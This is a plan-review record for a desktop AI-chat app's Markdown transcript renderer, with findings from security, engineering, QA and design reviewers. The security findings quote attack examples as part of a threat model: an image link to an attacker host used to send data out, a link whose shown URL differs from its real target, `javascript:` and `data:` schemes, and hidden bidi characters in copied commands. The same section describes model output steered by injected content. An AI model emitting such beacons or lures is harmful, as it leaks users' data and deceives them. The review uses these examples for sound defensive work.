[< Story](index.md)

# Plan Review — CV1.DS1.US2

**Date:** 2026-10-24
**Reviewed:** the first version of the plan, the story and the test guide, as authored in the Plan step (uncommitted at review time).
**Outcome:** the plan was revised with the twenty defects and the Navigator's rulings on R1–R3; the current version is [plan.md](plan.md), presented for approval.

## How it was reviewed

Four lenses were chosen for what this plan puts at risk:

- **security-engineer**, in for the first time in this Delivery Story: three
  dependencies and their trees enter the renderer, model-produced Markdown
  becomes a DOM tree, links leave the app to the system browser through a
  scoped permission, the clipboard is written;
- **engineer**, for the transcript model change, the new `transcript/`
  concern and its boundaries, memoization over a streaming parse, the follow
  logic's seam with the DOM, and the slices' order;
- **quality-assurance**, for whether the fixtures and tests prove every
  scenario against the fake host, happy-dom's limits (no layout, timers, the
  clipboard), and whether the route can be judged alone;
- **experience-designer**, for how an answer reads in Monaco at 16 px on
  Pi's colors beside Pi: the folds, the headings, the tool line, the way
  back to the latest.

Product-designer and ai-engineer were left out: the cut was made in DS1's
candidate table and the Navigator's captured request, and nothing
model-in-the-loop changes.

Each ran as an isolated reviewer (`pi -p` with the persona's full identity
from Mirror, no tools, no session, no extensions, nothing logged to Mirror).
Each saw the plan, the story, the test guide, the Delivery Story, the
repository rules, D3, D11, D13 and D15, the development guide's lifecycle and
verification sections, the debt ledger, the protocol's events, the host's
projection, the reducer, the row, the conversation screen, the test harness
(loader, worlds, queries, setup, fake host), the stylesheet and its test, the
capabilities file and the CSP, and Pi's own rendering as read from the
installed package: `getMarkdownTheme`, `buildCliHighlightTheme`,
`formatToolCallWithArgs`, the tool grounds, the thinking label, and every
role converted to hex with Pi's converter.

The Driver then verified the sharpest claims:

- `rehype-highlight` 7 brings `lowlight` 3, which runs highlight.js
  **11.11**; Pi's `cli-highlight` runs highlight.js **10.7.3**. HLJS 11
  emits scoped classes (`hljs-title function_`, `hljs-title class_`) where
  Pi's mapping keys are flat. The quality-assurance finding holds.
- The opener permission's scope is `https://*` only; react-markdown's
  default `urlTransform` keeps `http`, `https`, `mailto`, `tel` and relative
  URLs. The three reviewers who found this hold.
- Pi's TUI renders a link as an OSC 8 hyperlink when the terminal supports
  it, which iTerm2 does, so in the Navigator's terminal the URL is hidden;
  the parenthesized `(url)` is Pi's fallback for terminals without
  hyperlinks, and only when the text differs from the href. D4 therefore
  carries Pi, contrary to what the Driver's plan and the experience-designer
  assumed; the security-engineer's spoofing finding stands on its own.
- Pi's collapsed argument budget is `COLLAPSED_ARGS_CHARS = 100`.

## Navigator rulings

The Navigator took the Driver's recommendation on every decision.

| Decision | Ruling |
|---|---|
| R1 — the folded tool row | Pi's folded form: the line and up to ten lines of the result, expanding to the whole result with no nested scroll |
| R2 — long code lines | Wrap, as the terminal wraps Pi's |
| R3 — a link whose text is a URL that differs from its target | The target's host, muted after the text, in that one case only |

## The synthesis

**Taken into the plan as defects** (no ruling needed):

1. **Links are `https` only.** The kept schemes are reconciled with the
   opener's scope: `https` renders as a link; everything else (`http`,
   `mailto`, `tel`, `data:`, `javascript:`, relative, fragments, and GFM's
   autolinked `www.` literals) renders as text with no target. The index's
   acceptance line is corrected. The click handler covers `click` and
   `auxclick`, no `target` attribute is ever rendered, the opener's refusal
   is caught and said as a toast, and `Markdown.test.tsx` has one link per
   scheme with the opener's exact arguments asserted through `scriptIpc`.
   A Rust-side navigation guard for the webview is the layered defense,
   recorded in the debt ledger at this story's Debt Review (security 1, 7;
   engineer 4; quality-assurance 3; experience-designer 3).
2. **Images never become elements.** `img` in the components map renders
   the alt text muted, in brackets; `unsafe-answer` carries a remote and a
   `data:` image, and the test asserts no `<img>` lands (security 2;
   experience-designer 3).
3. **The highlight mapping is written in HLJS 11's class vocabulary**,
   carried by meaning from Pi's `buildCliHighlightTheme` and tagged with
   both sources. The test renders a snippet that exercises every mapped role
   and asserts each class is present *and* matched by a selector `app.css`
   actually defines, read from disk as `tokens.test.ts` reads it
   (quality-assurance 2).
4. **A highlight size cap.** A block above 32 KB is not highlighted and
   falls back to the code-block green, visually Pi's unknown-language
   behavior; finished rows are memoized as planned (security 4).
5. **Hidden characters are shown.** Bidi controls and zero-width characters
   in a code block render as a visible marker with a title; Copy copies the
   code node's text, not the DOM's; a fixture block carries one such
   character and the test asserts the marker and the copied bytes
   (security 5).
6. **The stack is pinned and its posture named.** Exact versions, the
   lockfile committed, no install script in the tree; D16 states that
   sanitization rests on react-markdown's defaults, so a bump of this stack
   is reviewed as a security change. `unsafe-answer` gains a `data:` link
   and a fake-host case that splits the `<script>` tag across deltas
   (security 6; quality-assurance 1).
7. **Slice 2 typechecks.** The `TranscriptRow` adaptation moves into slice
   2 with the model change; the reducer's tests are named as expected to
   change (engineer 2).
8. **The thinking fold is derived, not initialized.** `override: boolean |
   null`; shown open = `override ?? (text === "" && !done)`; and the
   auto-fold applies only while the view is following, so a held view
   never has content collapse under the eye (engineer 3;
   experience-designer 2). Tool rows are keyed by `toolCallId`.
9. **The code block's fallback keys on the `hljs` class**, not on the
   language name; `markdown-answer` gains a fence named `foo`; Copy copies
   the fence's content without a trailing newline; the "Copied" timer
   resets on re-click and clears on unmount; the test asserts "Copied"
   appears and the guide says the revert is route-verified (engineer 5;
   quality-assurance 6).
10. **Notices have one home.** Constructors in `conversations/transcript.ts`
    build the three notices; the store uses them for the extension failure;
    the delay formatter is private beside them; the retry reads "retrying in
    2s" (engineer 6; experience-designer D8).
11. **Pi's constants are carried**: 100 characters, `key=JSON(value)` pairs
    joined by spaces, `...` as the cut, and `formatToolDuration`'s shape;
    `format.ts` is tagged with its provenance (engineer 7).
12. **`Transcript.tsx` owns rows and following, nothing else.** The opening
    and failed states stay in `Conversation.tsx`; `Pulse` stays in `shell/`
    and is imported across (engineer 8).
13. **"Jump to latest" shows while not following**, scope 8's rule; D9 is
    amended. The scroll is instant; the button sits on the raised ground
    inside a hairline; the route adds "a long answer followed to the end
    with the button never appearing" (engineer 1; experience-designer 8;
    quality-assurance 8).
14. **The extension failure reaches the fake host.** A scripted turn gains
    `extensionErrors`, played through the fan-out and failed at teardown if
    never exercised, as held turns are; `Transcript.test.tsx` covers it
    (quality-assurance 1).
15. **Every element asserts its token class** (heading, code, link, tool
    ground, tone, thinking); the guide says plainly that hex is the
    Navigator's alone (quality-assurance 4).
16. **Streaming assertions name their release points** through
    `releaseThrough`, the pending ground pinned mid-turn, the no-syntax
    oracle at the end (quality-assurance 5).
17. **Route step 7 carries its fallback** in the Expected column, and the
    extension failure is named as fixture-proven only (quality-assurance 7).
18. **✓ in success, ✗ in danger**, the pulse muted (experience-designer 6).
19. **Vertical rhythm is named**, and said not to be a Pi role: more air
    above `h1` and `h2` than `h3`+; one line between blocks; the route reads
    two heading levels beside Pi (experience-designer 4).
20. **Table cells wrap within the measure** (experience-designer 7).

**Put to the Navigator:**

- **R1 — the folded tool row.** Pi's collapsed form is the header line
  *and* up to ten lines of the result, muted, with "… n more lines"; the
  plan folded to one line with no result, an unnamed departure. Options:
  carry Pi's form, expanding to the full result with no nested scroll; or
  keep the one-line fold as a named departure. **Recommendation:** Pi's
  form. The Navigator reads Pi daily and a tool-heavy turn reads as a
  narrative there; the window should not make him click to learn what
  happened (experience-designer 1, 5).
- **R2 — long code lines.** The terminal wraps Pi's; the plan scrolled them
  horizontally, where macOS hides the scrollbar and the right half of a
  line is invisible. Options: wrap, as the terminal does; or scroll, as a
  named departure. **Recommendation:** wrap (experience-designer 7).
- **R3 — a link whose visible text is itself a URL that differs from its
  target.** The one case where a hidden URL is a lure. Options: show the
  target's host muted after the text in that case only; or hide it always,
  as Pi in iTerm does. **Recommendation:** the host, in that one case: it
  costs nothing in the common case and keeps the tell where it matters
  (security 3).

## The reviews, as produced

### ◇ security-engineer

**Findings**

1. **The link-scheme allowlist disagrees with itself in three places (D1, D4, index.md acceptance, `capabilities/default.json`).** The plan keeps react-markdown's default `urlTransform` (http, https, mailto, tel, relative), the story's acceptance says links that are "not http, https or mailto" lose their target, but the opener permission's scope is `https://*` only — so http, mailto and tel links will render with an href, be click-prevented, and then be *denied* by the capability. `remark-gfm` autolinking makes this common, not theoretical: a bare `www.example.com` in model output becomes an `http://` link, i.e. a dead link on the normal path — which is exactly the pressure that gets a permission widened mid-implementation, and the plan's Non-Goals forbid new permissions. Fix it at the renderer: a custom `urlTransform` (or the `a` component) that keeps only the schemes the capability will actually open (https; mailto only by a named decision plus a capability change), strips the href for everything else including relative URLs and fragments, and a test in `Markdown.test.tsx` with one link per scheme asserting href presence and the exact `scriptIpc` opener arguments. Correct index.md's acceptance line to match whatever is decided.

2. **Images are unhandled, and the CSP is the only wall (Scope 3's components map).** The components map names headings through `pre` but not `img`; react-markdown renders `![x](url)` as an `<img src>` by default, and the default `urlTransform` keeps http/https for it. Today `img-src 'self' data: blob:` blocks the remote fetch — good — but that leaves a single control against the classic markdown-renderer exfiltration beacon (a model coaxed into emitting `![](https://attacker/[data])`), and a future CSP edit reopens it silently; meanwhile `data:` images render now, letting attacker-influenced content draw arbitrary pixels — fake notices, fake tool-success rows, "paste this in your terminal" imagery. Neutralize `img` explicitly in the components map (render the alt text or the source as text), add an image line (remote and `data:`) to the `unsafe-answer` fixture, and assert no `<img>` element lands in the DOM.

3. **D4 hides the URL, which downgrades Pi's posture into a spoofing surface.** Pi prints the URL muted after the link text precisely because text and target can disagree; the plan moves the URL to a hover title, so `[https://good.example/docs](https://evil.example/x)` reads as the good URL and opens the bad one in the system browser. The transcript's text is model output that has read attacker-influenced files and web content, so "click this link" lures are the realistic abuse path here; the browser's address bar is the only remaining tell. Cheap fix: render the href's host muted after the link text at least when the visible text is itself URL-shaped or differs from the target's origin — or keep Pi's muted full URL. If the Navigator rules to keep hover-only, record it in D16 as a conscious departure with the phishing trade-off named.

4. **Per-delta re-highlighting of an unclosed fence is a denial-of-service lever, not just a stutter (Scope 3, Risks).** While an answer streams, an unclosed fence parses as a code block on every `text_delta`, so `rehype-highlight` re-runs highlight.js grammars over a growing, attacker-shaped block on the main thread; highlight.js grammars have a ReDoS history, and a pathological block can freeze the webview mid-turn. `detect: false` already shrinks the grammar surface (good); add one more cap: skip highlighting above a byte threshold (e.g. tens of KB) and fall back to the code-block green — visually identical to Pi's unknown-language behavior, so it costs nothing. The memoization of finished rows is necessary but does not protect the streaming path.

5. **Copy is a conduit from model output into the person's terminal, and the webview is more spoofable than Pi's terminal (D5).** Browsers apply bidi reordering and render zero-width characters invisibly where iTerm largely does not, so a code block can *display* a benign command while `navigator.clipboard.writeText` copies reordered or invisible-character-laced text that the Navigator then pastes into a shell — the validation route itself says "paste in a terminal." Render Unicode bidi controls (U+202A–U+202E, U+2066–U+2069) and zero-width characters visibly in `CodeBlock.tsx` (an escaped marker, as GitHub does), keep Copy copying the exact source value of the code node rather than DOM text, and add a fixture block containing one such character with a test on both the visible marker and the copied bytes.

6. **"Three dependencies" is really the unified/micromark/hast tree, and that tree parses attacker-influenced bytes (D1).** react-markdown 10 plus remark-gfm plus rehype-highlight pulls on the order of dozens of transitive packages directly into the path that parses hostile content, and the whole sanitization posture rests on react-markdown's *defaults* — a future major bump that changes `urlTransform` or raw-HTML handling is a security change wearing an update's clothes. Pin the three exactly, commit the lockfile, verify none of the tree runs install scripts, and state in D16 that the posture is default-dependent so version bumps of this stack get reviewed, not waved through. The `unsafe-answer` tests are the right regression net for exactly this — extend the fixture with a `data:` link so a default change fails by name.

7. **The click guard covers `click` only; name the navigated-webview failure mode (Scope 3, Risks "The link that navigates").** The test asserts a click is prevented and the opener is called, but middle-click/`auxclick` and any future `target` attribute are separate activation paths; if navigation ever slips, the webview renders an attacker's page inside the app's chrome — IPC stays origin-gated, so commands are safe, but a page impersonating the app's sign-in asking for an API key is the realistic harm. Handle `auxclick`, assert no `target` attribute is ever rendered, and record a Rust-side webview navigation guard as the layered defense for a later story, since this plan rightly forbids Rust changes.

**Decisions**

- **D1** — Agree with conditions: keeping react-markdown's no-raw-HTML default (no `rehype-raw`) is the right core posture, but the default `urlTransform` must be replaced with an allowlist matching the opener capability (finding 1), the three packages pinned exactly, and future major bumps of this stack treated as security review (finding 6).
- **D4** — Agree with a condition: opener-only egress with preventDefault is right; hover-title-only URL visibility is not a control, so add host/mismatch display or record the departure explicitly (finding 3).
- **D5** — Agree with conditions: `detect: false` and the unknown-language fallback are security wins carried from Pi; add the highlight size cap (finding 4) and visible bidi/zero-width handling with source-value copy (finding 5).
- **D6** — Agree: arguments and results as React-escaped plain text in a capped `pre`, never through the Markdown pipeline, is the correct posture for tool output an attacker controls directly.
- **D7** — Agree, and for a stronger reason than the plan's performance one: plain-text thinking removes an entire injected-render surface; if the Navigator revisits for readability, that trade-off should be weighed as security, not style.
- **D8** — Agree: fixed names with provider/extension messages as plain text keeps error strings out of any parser.

**Verdict**

Approve with the changes above — the core sanitization posture (no raw HTML, scheme filtering, opener-only egress, CSP backstop, behavior-pinning tests) is sound, but the scheme allowlist must be reconciled with the capability, images neutralized, and the highlighter capped before implementation starts.

### ◇ engineer

**Findings**

1. **D9 and scope 8 disagree on when "Jump to latest" shows.** D9 says the button floats "while held and content has arrived"; scope 8 says "shown while not following"; the `Transcript.test.tsx` description fits either, since its scenario has both a scroll-off and a new row. "Content has arrived" requires a missed-content flag — set on a row change while not following, cleared on jump or on scrolling back — state the plan never models, so the implementer will either invent it or silently build the simpler rule against an approved sentence that says otherwise. Pick one before implementation; I recommend scope 8's rule (no extra state, and an idle "Jump to latest" while scrolled up is still truthful) and amending D9's wording.

2. **Slice 2 cannot be committed green as cut.** Slice 2 changes `Row`: `tool` loses `summary`, `assistant` loses `errorMessage`, `notice` gains `name`/`tone` — but `shell/TranscriptRow.tsx` reads `row.summary` and `row.errorMessage` and is not touched until slice 3. `npm run typecheck` fails at the slice 2 commit, violating the plan's own "each committed" and the repo's coherent-commit rule. Fold a minimal `TranscriptRow` adaptation into slice 2 — it can use the `format.ts` the same slice builds for the tool preview — or move the model change into slice 3. The same clause should name the reducer tests in `conversations/transcript.test.ts` as expected to change (shapes, notice text), so the "existing test needs changing" stop condition does not trip on the story's own model.

3. **The Thinking fold state, as worded, encodes a bug.** Scope 6 says "the open state is local to the row and starts as 'open while streaming with no text yet'" — that steers toward `useState(initiallyOpen)`, and state initialized from props never updates, so the fold would never close when the answer's text begins. The working model is a derived default plus an explicit override: `override: boolean | null` in local state, display open = `override ?? (text === "" && !done)`, click sets the override. The plan should name this shape so the planned test ("folded when the text begins") doesn't cost a debugging cycle. One sentence of insurance in the same area: rows are keyed by index in the log; the reducer is append-only so that holds, but key tool rows by `toolCallId` since it exists.

4. **Links the opener's scope refuses are undecided.** D1 keeps `urlTransform`'s `http`, `mailto` and `tel`, so those render as live links, but the capability file scopes `opener:allow-open-url` to `https://*` only — a click on `mailto:` or plain `http:` rejects at the IPC layer, and widening the scope is a permission change the Non-Goals forbid, i.e. a mid-story stop. Decide now: either the click handler catches the rejection and toasts, or only `https` links get the handler and the rest render without a target like `javascript:` does. Whichever is chosen, `scriptIpc` should script the refused case too, since the harness fails tests on unscripted Tauri calls.

5. **CodeBlock's fallback signal is keyed on the wrong thing, and the unknown-language path is untested.** Scope 4 says green "when there is no highlighting" but the mechanism described is "the language read from the code element's class" — a fence named `foo` keeps its `language-foo` class while rehype-highlight leaves no highlight spans, so keying on language presence ships a block that is neither highlighted nor green. Key on the `hljs` class rehype-highlight adds when it actually highlights, and add an unknown-named fence to `markdown-answer` — the planned test covers only `ts` and a bare fence, and the route reads only known languages, so this path would otherwise ship unexercised (and whether rehype-highlight 7 skips or throws on an unknown name should be pinned by that test). For Copy, read `textContent` from a ref at click time — exact through highlight spans, no HAST walking — and decide the trailing newline, since "exact text" is the oracle; the 1.5 s timer needs reset on re-click and cleanup on unmount.

6. **The retry delay's formatter has no home, and notice construction is split.** D8's "again in 2s" is a third format — not Pi's duration (`2.0s`) and not the preview — and scope 2 bakes it into the stored notice text, which means the reducer in `conversations/` either imports `transcript/format.ts` (inverting the dependency direction, since `transcript/` components already import `Row` from `conversations/`) or duplicates the formatting. Meanwhile the extension-failure notice is built in `store.ts` and the retry/provider-error notices in the reducer: three notices, two homes. Either store raw fields (`attempt`, `delayMs`, `message`) and let `Notice.tsx` compose the words — truest to the "data only" store rule — or export notice constructors from `conversations/transcript.ts` that the store also uses, with the delay formatter private beside them. The plan should pick; this is exactly the seam an implementer guesses at.

7. **`format.ts` carries Pi's logic without Pi's constants.** Scope 2 says the preview is "cut as Pi cuts them", but `COLLAPSED_ARGS_CHARS` is never stated, so `format.test.ts` oracles get written against a source-dive guess and can drift silently from Pi — the drift D15's carried-and-tagged discipline exists to prevent. The plan carried every hex literally with its source; carry the preview budget and the exact join/cut rule (`key=JSON.stringify(value)`, `...` suffix) the same way, and tag `format.ts` with its provenance (`formatToolCallWithArgs`, `formatToolDuration` in Pi's render-utils).

8. **The Transcript extraction leaves the opening/failed states homeless.** Scope 8 says `Transcript.tsx` "takes the log out of Conversation.tsx", but today's inner `Transcript` also renders the `opening` and `failed` states inside the scroll area, using `shortenHome` and `Pulse` from `shell/`. The plan must say whether those move (then Transcript's props include status, failure and the path, and `transcript/` imports two `shell/` helpers across its new boundary) or stay in `Conversation.tsx` (visually safe, since both states only occur with empty rows). I recommend the latter — Transcript owns rows and following, nothing else — and note that `Pulse` is needed by `ToolRow` and the streaming row regardless, so either accept the `transcript/ → shell/Pulse` import or move the leaf component; naming it avoids an ad-hoc call mid-slice.

**Decisions**

- **D1** — Agree. The composition (no `rehype-raw`, default `urlTransform`, `detect: false`) is right; finding 4's scheme question is a gap beside it, not in it.
- **D4** — Agree with a condition: resolve the non-https schemes (finding 4) in the plan, not at the keyboard.
- **D5** — Agree with a condition: the fallback keys on the `hljs` class, Copy reads `textContent`, and the unknown-named fence gets a test (finding 5).
- **D6** — Agree. Keeping raw `args`/`result` in the row and formatting at render is the right split; condition: carry Pi's constants into `format.ts` (finding 7).
- **D7** — Agree with a condition: specify the derived-default-plus-override fold state (finding 3). Plain text instead of Markdown for thinking is the right per-delta call.
- **D8** — Agree with a condition: decide where notice text is composed and keep all three constructions in one home (finding 6).
- **D9** — Agree with a condition: the pure `isAtBottom` plus a `following` flag is the right, testable seam, but reconcile the button's condition with scope 8 (finding 1).
- **D10** — Agree. The reducer staying in `conversations/` is correct — it is store data, and `transcript/` depending on it one-way is the clean direction; just settle the `Pulse`/state-rendering imports (finding 8) so the boundary is real, not aspirational.

**Verdict**

Approve with the changes above — the architecture, model and slice shape are sound; the changes close one internal contradiction (finding 1), one sequencing break (finding 2), and six guess-points that would otherwise surface as mid-story stops or silently wrong paths.

### ◇ quality-assurance

**Findings**

1. **The planned Transcript.test.tsx cannot be written as planned: the fake host has no way to emit `session.extension_error`, and `unsafe-answer` has no fake-host case.** Scope 9 says "one case per fixture" then lists an extension-failure case — but `session.extension_error` is a `HostEvent`, not a `SessionEvent`, so it cannot live in a turn fixture, and `World` in `testing/fakeHost.ts` (identity, models, journeys, turns, providers, failures, heldOpens, sessionCwds) has no field to script it. Meanwhile `unsafe-answer` is a fixture with no listed case, so sanitization is never proven through the full pipeline (reducer → row → Markdown re-parsing on each delta), even though the story's outcome promises every rendering path a UI test against the fake host. The plan must name the harness extension (e.g., a world- or turn-level `extensionErrors` entry, played through the same fan-out, failed at teardown if never exercised, like held turns) and add a Transcript case for `unsafe-answer` that splits the `<script>` tag across deltas, proving the posture holds on every intermediate string, not only on the finished text.

2. **The highlighting oracle is one class — `hljs-keyword` — which is the one class guaranteed to survive, so a broken Pi-to-lowlight mapping passes CI.** Scope 1 transcribes `buildCliHighlightTheme` into a CSS block, but lowlight 3 is highlight.js 11, which emits sub-scoped classes (`hljs-title function_`, `hljs-title class_`, second part unprefixed) where Pi's cli-highlight keys are flat (`function`, `title`, `class`). A mapping block keyed `.hljs-function` would never match anything, functions would render in ink, and the only planned assertion ("the `ts` fence has `hljs-keyword` spans") stays green; the Navigator's eye at route step 1 becomes the only check. The Markdown/CodeBlock test should render a snippet from `markdown-answer` that exercises every mapped role (keyword, string, number, comment, function title, type/built_in) and assert each expected class is present *and* styled by a selector the CSS block actually defines — a mismatch must fail in `npm test`, not in iTerm.

3. **D1 keeps `mailto` and `tel` hrefs that D4's click handler cannot open: the capability scope is `https://*` only.** `capabilities/default.json` permits the opener for `https://*`; `urlTransform` keeps `http`, `mailto`, `tel`. A kept non-https link renders as a live link whose click is refused by the capability — in the app a silent failure or unhandled rejection, in a test an IPC denial that fails at teardown only if some future test happens to click one. No planned test or route step covers a non-https scheme click; the Non-Goals forbid new permissions, so the consistent fix is to narrow the allowlist to `https` (others render as text or inert) and add a Markdown.test.tsx case asserting a `mailto:`/`http:` link's click behavior explicitly.

4. **The first acceptance scenario is stated in hex, but no automated test can see a color: the element→token link is unasserted.** happy-dom applies no CSS and vitest serves CSS imports empty (the `tokens.test.ts` comment says so), so "the heading is `#cd9a22`" decomposes into: token value in both blocks (tokens test — planned) plus *the heading element carries the heading token's class* — which no planned test asserts. The same hole covers the tool grounds (`toolPendingBg`/`toolSuccessBg`/`toolErrorBg`), notice tones, and thinking color: "tone: danger" is a class assertion or it is nothing. Markdown.test.tsx and ToolRow/Notice tests should assert the token-bearing class per element, and the plan should state plainly that hex verification is the Navigator's alone — that closes the chain element→class→token→carried value.

5. **Mid-stream oracles are undefined, and with `retry: 0` an imprecise release point is a flake or a false pass.** The fixture deliberately splits deltas inside syntax (`**bo` / `ld**`), so mid-stream the transcript *will* legitimately show `**bo` as literal text; "no syntax as text" is a terminal-only oracle, yet the planned case says "shows its heading while streaming… with no syntax as text" without saying when. Each streaming assertion needs a named `releaseThrough` point: release past the heading's deltas → assert the heading; release through a `thinking_delta` → assert thinking open; release through `tool_start` → assert the pending ground before `tool_end` (nothing currently pins the pending state mid-turn); release the rest → assert the full no-`**`/no-backtick oracle. D9's button condition ("while held *and content has arrived*") also dictates the sequence scroll-off → new row → button appears; a test that asserts the button immediately after scroll-off tests a different rule than the one decided. Write the release points into the test plan now, since full playback plus the harness's `console.error` rule already proves scenario 2 (no error on any delta) for free.

6. **The 1.5 s "Copied" timer is unspecified territory where the harness's own rules collide.** AGENTS.md forbids fixed delays; asserting the revert to "Copy" with real timers means a 1.5 s wait, and `vi.useFakeTimers` with `userEvent` requires the `advanceTimers` option or the test hangs — a classic flake under `--sequence.shuffle` with `retry: 0`. Decide in the plan: assert only the appearance of "Copied" (and say the revert is route-verified), or use fake timers with `userEvent.setup({ advanceTimers })` for that one test; also note that a timer still pending at teardown must not trip the harness. Same section: since happy-dom applies no CSS, a hover-revealed Copy button is always findable in tests — the test proves function, and route step 2 must carry discoverability.

7. **Route step 7's pass condition undermines "Pass: every observation holds," and the extension failure is silently absent from the route.** "Disconnect the network mid-turn" may not produce a `retry` (the plan admits it) and "let it fail" may take minutes of backoff or surface as a different failure path than `message_end` + `errorMessage` — yet the guide's pass line is absolute while step 7 contains its own escape hatch. Rewrite step 7 with an explicit fallback outcome ("if no retry event is observed, record it; the step passes on the fixture tests" — stated in the step's Expected column, so the Navigator can judge alone), and add one line to the guide naming the extension-failure notice as consciously fixture-proven only, since nothing in the real app provokes it on demand; the development guide requires the route to say what is consciously left out.

8. **The follow tests prove the state machine but cannot catch the one autoscroll bug that actually ships: programmatic `scrollTo` firing a scroll event that disengages following.** In real WebKit, the component's own `scrollTo` fires scroll events; if a mid-flight event reads metrics off the bottom, `following` clears spuriously and the view silently stops tracking a long answer — invisible in happy-dom, where no scroll event fires unless the test dispatches it. Route step 6 only tests the hold direction; add the complementary observation ("leave the view untouched at the bottom through an entire long answer: it follows to the end, and 'Jump to latest' never appears"), and consider having `follow.ts` ignore scroll events while an auto-scroll is in flight, with a unit test for that guard.

**Decisions**

- **D1** — agree with a condition: the kept-scheme list must match the opener capability (finding 3), and the default sanitization posture must be pinned through the fake host, not only in the alone-test (finding 1).
- **D2** — agree; the existing `tokens.test.ts` equality assertion covers the new tokens in both blocks with no change.
- **D4** — agree with a condition: define and test what a kept non-https link does when clicked (finding 3).
- **D5** — agree with a condition: the per-role highlight oracle (finding 2) and a stated timer strategy for "Copied" (finding 6); hover-reveal is route-only and the guide should say so.
- **D6** — agree; `aria-expanded` plus the name and ✓/✗ text give solid accessible oracles, with the ground asserted as a token class (finding 4) and the pending state pinned mid-stream via a release point (finding 5).
- **D7** — agree with a condition: the open→folded transition is sequencing-dependent and needs named release points (finding 5).
- **D8** — agree; named notices ("Retry 1 of 3", "Provider error") are far better test oracles than the current raw strings, provided tone is asserted as a class (finding 4).
- **D9** — agree with a condition: the tested sequence must match "held *and* content arrived" (finding 5), and the re-entrancy gap is named and route-covered (finding 8).

**Verdict**

Approve with the changes above: the fixture-driven, fake-host structure is right and the shuffle runs and harness discipline are real safeguards, but as written the plan contains one test that cannot be built (extension failure), one fixture never played (unsafe-answer), and oracles thin enough that a broken highlight mapping, a mis-tokened element, or a dead mailto link would reach the Navigator's eyes as the first detector.

### ◇ experience-designer

**Findings**

1. **The folded tool row hides the result Pi shows — an unnamed departure from Pi (D6, scope 5).** The plan's own reading of Pi says a collapsed tool is the header, the `key=value` preview *and ten lines of output*; D6 folds to one line with no output at all. Beside Pi in iTerm, a tool-heavy turn in Mirror will read as a column of silent status chips where Pi reads as a narrative of what happened — the Navigator must click every row to learn anything, which changes the daily reading experience more than any color. D15 says a departure is a decision; this one is currently silent. Either carry a short muted result tail (even one or two lines) into the folded row, or add the one-line fold to the decisions table with its reason, so the Navigator rules on it knowingly.

2. **The thinking auto-fold can yank the view (D7 with D9, scope 6/8).** The fold fires on the first text delta — exactly the moment the person may be mid-read in a long thinking block. WKWebView has no scroll anchoring, so when the block collapses, content below jumps up; if the person has scrolled up inside the thinking (following cleared), scrollTop clamps and the view lurches — the one motion this product forbids. Even while pinned, the lines under the eye vanish and are replaced by "Thought" plus the answer's first words. Tie the fold to the follow rule the story already has: auto-fold only while `following` is true; when the person holds the view, the thinking stays open until they fold it or the view returns to the bottom. One sentence in D7 fixes it.

3. **Markdown can carry things the window cannot honor: images and non-https links (scope 3, D1, D4).** The dependency note says it plainly: react-markdown renders `![…](https://…)` as `<img src>`, and the CSP (`tauri.conf.json`) blocks remote images — so an answer with an image shows a broken-image glyph, a foreign object on Pi's clean canvas. Likewise `urlTransform` keeps `http`, `mailto` and `tel`, but the opener capability allows only `https://*`, so those render as live-looking links that do nothing when clicked — a dead affordance is a small trust leak in a product built on calm reliability. Add an `img` entry to the components map (render the alt text, or alt text as a link), and align the kept schemes with what the opener can actually open, or widen the capability by decision.

4. **Headings flatten to one undistinguishable level, and the answer's internal rhythm is unspecified (D3, scope 3).** At one size, one color and one weight, `##` and `####` render identically; a sectioned answer loses its outline, which Pi's terminal at least implies through source structure. The plan also names every element but no vertical rhythm — margins above headings, between paragraphs, around lists and blocks are left to the first build's accidents, and rhythm is what makes 16 px Monaco at 72 ch read as prose rather than a log. Specify spacing by level (more air above h1/h2 than h3+) — spacing is not a Pi role, so say so and it stays inside D15 — and name the paragraph/list/block rhythm in scope 3. Have route step 1 include an answer with two heading levels, read beside Pi.

5. **The expanded tool result sits behind a nested scroll (scope 5) — a second unnamed departure.** Pi's expanded form shows the result in full; the plan caps the `pre` and scrolls inside it, so even "opened" the person cannot read a result without operating a scrollbar inside the scrolling transcript — a trackpad scroll trap at every opened tool. Nested scroll regions are exactly the fidgety machinery this window avoids. Expand to full (the transcript already scrolls), or make the cap generous with a "Show all" step, and record whichever as the decision.

6. **The ✓/✗ marks have no named color, and in light they carry almost everything (scope 1, D6, test guide step 8).** The light tool grounds are tints two to four points off the canvas (`#e4e5e6`/`#dee9e1`/`#eee2e1` on `#efeeee`); step 8 checks they are distinct, but if they read faint, the status mark is the only state signal left — and the plan never says what color it is (today's code draws it muted). Name it: ✓ in `--color-success`, ✗ in `--color-danger`, pulse muted as it is. Both tokens exist in both themes; this costs nothing and makes the error row unmistakable on either canvas.

7. **Wide content past the 72 ch measure is undecided: long code lines and tables (scope 3, 4; D5).** Pi wraps long code lines because the terminal forces it; the plan scrolls them horizontally, where macOS overlay scrollbars hide the affordance and the right half of a 110-character line is simply invisible — an unnamed departure in how code is read. Tables get hairlines and a bold header but no overflow behavior: a five-column model table will squash or spill unpredictably. Decide both in the plan: wrap code as Pi does or name the scroll as a decision (and add a long-line block to route step 1), and let table cells wrap within the measure or give the table the block's scroll.

8. **Following needs two small words: *instant*, and a ground under the button (D9, scope 8).** The scroll-to-end must be instant (`behavior: auto`), as today's code does — smooth scrolling would fight the stream and make `isAtBottom` lie mid-animation, breaking the follow flag's own logic; say it so the first build doesn't "improve" it. "Jump to latest" floats over arbitrary content — code grounds, tool grounds — so it needs the raised ground and a hairline to stay legible everywhere. The 24 px threshold is one line-height exactly, tight for a momentum trackpad, but it is named as the first value to tune at the route, which is the right posture.

**Decisions**

- **D1** — Agree, with the condition in finding 3: the default sanitization is Pi-faithful (raw HTML as text is what a terminal shows), but the components map must cover `img`, and the kept URL schemes should match what the opener can actually open.
- **D2** — Agree. Roles over hues keeps TS2's contract and keeps every transcript color auditable against Pi's files.
- **D3** — Agree with a condition: one size holds, but differentiate levels by space above and name the answer's internal rhythm (finding 4).
- **D4** — Agree with conditions: hiding the URL is the right window-native move and the departure is named, but verify the `title` tooltip actually surfaces in the Tauri WKWebView at the route, and note it gives a keyboard-focused link nothing — acceptable now, worth a line.
- **D5** — Agree with the wrap-versus-scroll decision made explicit (finding 7); Copy on hover *and focus* is right, and 1.5 s of "Copied" is the correct quiet confirmation.
- **D6** — Agree only once the one-line fold is named as a departure from Pi's ten-line collapsed preview, or softened with a short result tail (finding 1); the args preview, duration format and grounds are faithfully carried.
- **D7** — Agree with the fold obeying the follow rule (finding 2). Plain-text thinking over Markdown is the right call for something read, not studied, and the departure is properly named.
